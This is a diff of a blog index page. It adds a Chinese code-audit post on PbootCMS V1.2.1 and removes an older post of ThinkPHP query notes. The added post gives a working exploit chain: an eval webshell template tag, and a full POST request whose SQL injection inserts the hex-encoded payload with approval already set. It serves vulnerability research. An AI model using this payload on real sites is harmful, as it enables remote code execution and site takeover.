@@ -236,6 +236,200 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/" itemprop="url">代码审计 | PbootCMS_V1.2.1组合漏洞-->前台无限制命令执行</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-17T08:15:41+08:00">
+                2018-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>跟大佬成功学到一招,insert注入进数据库修改留言状态+系统解析IF标签导致Getshell</p>
+</blockquote>
+<hr>
+<p>PbootCMS分析可参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1SQL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/</a></p>
+<p>##<strong>1.有限制的前台代码执行:</strong></p>
+<p>漏洞成因:</p>
+<pre><code>在前台留言处可利用IF标签插入PHP代码,后台管理员审核(限制)后,在显示到前台时造成代码执行
+</code></pre><p>代码分析:<br>追踪解析<code>IF</code>标签的函数:</p>
+<pre><code>apps\home\controller\ParserController.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/y2rorr5u2z6l9b056an74xai/image_1cq02djogf9i7iv5t88kb1o1r13.png" alt="image_1cq02djogf9i7iv5t88kb1o1r13.png-115.2kB"></p>
+<p>漏洞利用:<br>a.留言处插入我们的<code>php</code>代码:<code>{pboot:if(eval($_POST[z]))}!!!{/pboot:if}</code><br><img src="http://static.zybuluo.com/chhyx/3sbr2ji5f6ognq4bni8931k6/image_1cq01gp3qd3m1lii14dajg1e7f9.png" alt="image_1cq01gp3qd3m1lii14dajg1e7f9.png-71.5kB"></p>
+<p>b.管理员在后台审核,点击显示按钮后<br><img src="http://static.zybuluo.com/chhyx/yds22utr7vls2ieea9gpkqao/image_1cq01pm8h130ib1cabh1g5klpc9.png" alt="image_1cq01pm8h130ib1cabh1g5klpc9.png-63.6kB"></p>
+<p>c.返回前台触发漏洞:<br><img src="http://static.zybuluo.com/chhyx/nydx70lad9cgc0n3axu17o43/image_1cq01s09huhf172n67u18kl1875m.png" alt="image_1cq01s09huhf172n67u18kl1875m.png-40.4kB"></p>
+<p>因为这里需要管理员点击才能触发,所以显得有些鸡肋,但是这里我们可利用<code>insert</code>注入在插入数据库时就改变其显示状态来进行漏洞利用<br><img src="http://static.zybuluo.com/chhyx/rv54ynnytclos27cn3r8dbr0/image_1cq04ojff1qi710tllhq3981bn99.png" alt="image_1cq04ojff1qi710tllhq3981bn99.png-247.6kB"></p>
+<p>##<strong>2.留言处<code>insert</code>注入:</strong><br>漏洞成因:</p>
+<pre><code>使用有问题的底层`insert`操作,对数组的`key`值无过滤且直接拼接导致`SQL注入`问题
+</code></pre><p>代码分析:<br>定位到留言的操作的文件</p>
+<pre><code>#apps\home\controller\MessageController.php add()函数
+public function add()
+{...
+    if ($_POST) {
+
+        if (time() - session(&apos;lastsub&apos;) &lt; 10) {
+            alert_back(&apos;您提交太频繁了，请稍后再试！&apos;);
+        }
+        // 验证码验证
+        // 读取字段
+        if (! $form = $this-&gt;model-&gt;getFormField(1)) {
+            alert_back(&apos;留言表单不存在任何字段，请核对后重试！&apos;);
+        }
+        // 接收数据
+        $mail_body = &apos;&apos;;
+        foreach ($form as $value) {
+            $field_data = post($value-&gt;name);
+
+            if (is_array($field_data)) { // 如果是多选等情况时转换
+                $field_data = implode(&apos;,&apos;, $field_data);//数组合并为字符串
+            }
+            if ($value-&gt;required &amp;&amp; ! $field_data) {
+                alert_back($value-&gt;description . &apos;不能为空！&apos;);
+            } else {
+                $data[$value-&gt;name] = post($value-&gt;name);   //关键点
+                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
+            }
+        }
+
+        // 设置额外数据
+        if ($data) {
+            $data[&apos;acode&apos;] = session(&apos;lg&apos;);
+            $data[&apos;user_ip&apos;] = ip2long(get_user_ip());
+            $data[&apos;user_os&apos;] = get_user_os();
+            $data[&apos;user_bs&apos;] = get_user_bs();
+            $data[&apos;recontent&apos;] = &apos;&apos;;
+            $data[&apos;status&apos;] = 0;
+            $data[&apos;create_user&apos;] = &apos;guest&apos;;
+            $data[&apos;update_user&apos;] = &apos;guest&apos;;
+        }
+
+        if ($this-&gt;model-&gt;addMessage($data)) {//跟进addmessage()
+...
+</code></pre><p>跟进<code>addMessage()</code>函数 </p>
+<pre><code>public function addMessage($data)
+   {
+       return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
+   }
+</code></pre><p>跟进insert():<br><img src="http://static.zybuluo.com/chhyx/xbmnhou6jp2w877deyajy1fe/image_1cq06973213jb11li1cta1l0ps4o3d.png" alt="image_1cq06973213jb11li1cta1l0ps4o3d.png-90.2kB"></p>
+<p>因为底层<code>insert</code>操作对数组的<code>key</code>值无过滤且直接拼接导致<code>SQL注入</code>问题</p>
+<p>SQL漏洞利用:<br><img src="http://static.zybuluo.com/chhyx/05koygr7wi11r9am4vbbbqaf/image_1cq05jbedse310ou1s4t1evlif6m.png" alt="image_1cq05jbedse310ou1s4t1evlif6m.png-91kB"></p>
+<p>##<strong>3.组合漏洞—前台无限制命令执行:</strong></p>
+<pre><code>url:http://127.0.0.1:81/index.php/Message/add
+
+POST:content=1&amp;mobile=1&amp;contacts[acode`,`mobile`,`content`,`user_ip`,`user_os`,`user_bs`,`recontent`,`status`,`create_user`,`update_user`,`create_time`,`update_time`) VALUES (&apos;cn&apos;,&apos;1&apos;,0x7B70626F6F743A6966286576616C28245F504F53545B7A5D29297D2121217B2F70626F6F743A69667D,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;); -- a] = 1&amp;checkcode=xxxx
+</code></pre><p>填写验证码点击提交后抓包：<br><img src="http://static.zybuluo.com/chhyx/gm2f2sxpuz13hpv89hr8npsv/image_1cq05u1j6s1k105up411nq6th713.png" alt="image_1cq05u1j6s1k105up411nq6th713.png-182.7kB"></p>
+<p>可看到新插入的留言状态(<code>status</code>)为1<br>返回前台成功利用:<br><img src="http://static.zybuluo.com/chhyx/11utg2zml2gxlhyelusxmif0/image_1cq0625m4bi91qh11sqm16ea1mhc30.png" alt="image_1cq0625m4bi91qh11sqm16ea1mhc30.png-45.8kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/SQL注入基础/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2136,243 +2330,6 @@ public function addAll($dataList,$options=array(),$replace=false)
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/28/TP框架数据操作/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/28/TP框架数据操作/" itemprop="url">基础知识 | TP框架数据操作</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-28T08:15:41+08:00">
-                2018-09-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>计划把TP框架的基础部分看一看以帮助审计,就先以3.2.x的手册练习,持续更新……</p>
-</blockquote>
-<hr>
-<p>连贯操作:</p>
-<pre><code> public function testsql(){
-    $User = M(&quot;User&quot;); // 实例化User对象
-
-    $result = $Model-&gt;select();
-    //SELECT * FROM `user`
-
-    //1.where：完成多种查询操作
-    //字符串查询
-    $User-&gt;where(&apos;type=1 AND status=1&apos;)-&gt;select();
-    //执行的sql语句为:select * from User where type=1 and status=1;
-
-    //数组查询
-    $map[&apos;id&apos;] = 1;
-    $map[&apos;name&apos;] = &apos;test&apos;;
-    $user-&gt;where($map)-&gt;select();
-    //sql语句:select * from where id=1 and &apos;name&apos; = &apos;test&apos;;
-
-    //表达式查询   sql注入出现多的地方
-    $map[&apos;name&apos;] = array(&apos;eq&apos;,&quot;1&quot;);//其他表达式:GT EGT LT ELT LIKE BETWEEN IN EXP
-    $user-&gt;where($map)-&gt;select();
-    echo M(&apos;user&apos;)-&gt;_SQL();//SELECT * FROM `user` WHERE `name` = &apos;1&apos;
-
-
-    //2.table：主要用于指定操作的数据表
-    $Model-&gt;table(&apos;gather&apos;)-&gt;where(&apos;id=1&apos;)-&gt;select();
-    //SELECT * FROM `gather` WHERE ( id=1 ) 由user表暂时切换到gather表
-
-
-    //3.order:用于对操作的结果排序
-    $Model-&gt;order(&apos;id desc&apos;)-&gt;limit(5)-&gt;select();
-    //SELECT * FROM `user` ORDER BY id desc LIMIT 5
-    $Model-&gt;order(&apos;name desc,id&apos;)-&gt;limit(5)-&gt;select();
-    //支持多个字段排序 如果没有指定desc或者asc排序规则的话，默认为asc。
-
-
-    //4.field 标识要返回或者操作的字段，可以用于查询和写入操作
-    //查询：
-    $result = $Model-&gt;field(&apos;id,name&apos;)-&gt;select();
-    //SELECT `id`,`name` FROM `user
-
-    $result = $Model-&gt;field(&apos;id,SUM(id)&apos;)-&gt;select();
-    //可执行函数 user() database()等
-
-    $Model-&gt;field(&apos;pwd&apos;,true)-&gt;select();
-    //排除pwd这个字段  sql:SELECT `Id`,`name` FROM `user`
-
-    //写入：
-    $Model-&gt;field(&apos;id,name,pwd&apos;)-&gt;create();
-    //也可以字段合法性检测 合法字段只有id name pwd这三种
-
-
-    //5.union 联合查询 必须保证字段数量一样  每个union方法相当于一个独立的SELECT语句
-    $Model-&gt;field(&apos;id&apos;)-&gt;table(&apos;gather&apos;)-&gt;union(array(&apos;field&apos; =&gt; &apos;pwd&apos;,&apos;table&apos; =&gt; &apos;user&apos;))-&gt;union(array(&apos;field&apos;=&gt;&apos;goods_name&apos;,&apos;table&apos;=&gt;&apos;goods&apos;))-&gt;select();
-
-
-
-    //6.cache  
-    $result = $Model-&gt;cache(&apos;key&apos;,60)-&gt;find();
-    //find返回一条数据 缓存有效期为60s
-}
-</code></pre><p>CURD操作:</p>
-<pre><code>public function test_CURD(){
-    $Model = M(&apos;user&apos;);
-//CURD操作
-//1.数据创建 只是保存在内存中 只有用add或save才会写入数据库中
-$data[&apos;name&apos;] = &apos;p0rz9&apos;;
-    $data[&apos;pwd&apos;] = &apos;123456&apos;;
-$Model-&gt;create($data);
-var_dump($Model-&gt;name);//直接读取数据
-    $Model-&gt;name = &apos;P0rz9&apos;;//直接修改数据
-
-
-    //2.数据写入 
-    $Model-&gt;add();
-    //sql:INSERT INTO `user` (`name`,`pwd`) VALUES (&apos;P0rz9&apos;,&apos;123456&apos;) 
-
-    //字段过滤 写入时可用field过滤非法字段
-    $Model-&gt;field(&apos;name&apos;)-&gt;data($data)-&gt;add();
-    //最终只有name字段的数据写入 pwd字段被过滤
-
-    //字段内容过滤 filter方法对其内容过滤 strip_tags为过滤函数
-    $Model-&gt;data($data)-&gt;filter(&apos;strip_tags&apos;)-&gt;add();
-
-    //3.数据读取
-    $result = $Model-&gt;where(&apos;id=1&apos;)-&gt;find();//返回一行数据(或关联数据)
-    var_dump($result);//也可用data()获取查询后的数据:var_dump($Model-&gt;data());
-
-
-
-    //4.更新数据
-    $data[&apos;name&apos;] = &apos;kkk&apos;;
-    $Model-&gt;where(&apos;Id=1&apos;)-&gt;save($data);//数据对象属性操作
-    $Model-&gt;name = &apos;ThinkPHP&apos;;
-    $Model-&gt;where(&apos;id=1&apos;)-&gt;save();//对象方式操作
-
-
-    //5.删除数据
-    $Model-&gt;where(&apos;Id=5&apos;)-&gt;delete(); // 删除id为5的用户数据
-    $Model-&gt;delete(&apos;1,2,5&apos;); // 删除主键为1,2和5的用户数据
-    $Model-&gt;where(&apos;status=0&apos;)-&gt;delete(); // 删除所有状态为0的用户数据
-    $Model-&gt;where(&apos;status=0&apos;)-&gt;order(&apos;create_time&apos;)-&gt;limit(&apos;5&apos;)-&gt;delete(); 
-    //删除所有状态为0的5个用户数据 按照创建时间排序
-</code></pre><p>}</p>
-<p>TP自带的核心函数:</p>
-<pre><code>public function Test_Think_Func(){
-
-    $User = D(&apos;User&apos;);// 相当于 $User = new \Home\Model\UserModel();
-    $User-&gt;select(); //执行具体的数据操作
-
-    $User = M(&apos;User&apos;);// 和用法 $User = new \Think\Model(&apos;User&apos;);等效
-    $User-&gt;select();
-
-}
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2423,7 +2380,7 @@ var_dump($Model-&gt;name);//直接读取数据
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
